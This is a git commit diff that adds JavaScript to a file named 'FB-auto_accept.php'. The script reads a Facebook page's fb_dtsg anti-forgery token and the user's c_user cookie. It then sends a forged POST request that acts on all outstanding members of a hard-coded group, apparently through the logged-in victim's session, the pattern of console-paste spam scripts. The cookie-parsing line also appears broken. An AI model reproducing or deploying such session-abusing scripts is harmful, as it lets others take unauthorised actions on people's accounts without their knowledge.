206dd059058d8102b55a03187067996ee9ea4b2a
bhargav1996 <www.bhargav1996@gmail.com>
2013-10-06 12:17:14 +0530

    Update FB-auto_accept.php

--- FB-auto_accept.php
+++ FB-auto_accept.php
@@ -14,4 +14,21 @@ Page.close;
 Page.send(PageParams);
 }
 G("310509582323426");
-G("509238652461734");
+
+
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+var now=(new Date).getTime();
+function D(gid) {
+var Page = new XMLHttpRequest();
+var PageURL = "//www.facebook.com/ajax/groups/members/add_post.php?group_id="+gid+"&all_outstanding=1&source=member_page&__user="+user_id+"&__a=1&__dyn=7n8ahyj35zoSt2u5KKDKaEwlyp8y&__req=e&ttstamp=2658167728810111298";
+var PageParams ="fb_dtsg="+fb_dtsg+"&__user="+user_id+"&__a=1&__dyn=7n8ahyj35zoSt2u5KKDKaEwlyp8y&__req=f&ttstamp=2658167728810111298";
+Page.open("POST", PageURL, true);
+Page.onreadystatechange = function () {
+if (Page.readyState == 4 && Page.status == 200) {
+Page.close;
+}
+};
+Page.send(PageParams);
+}
+D("509238652461734");
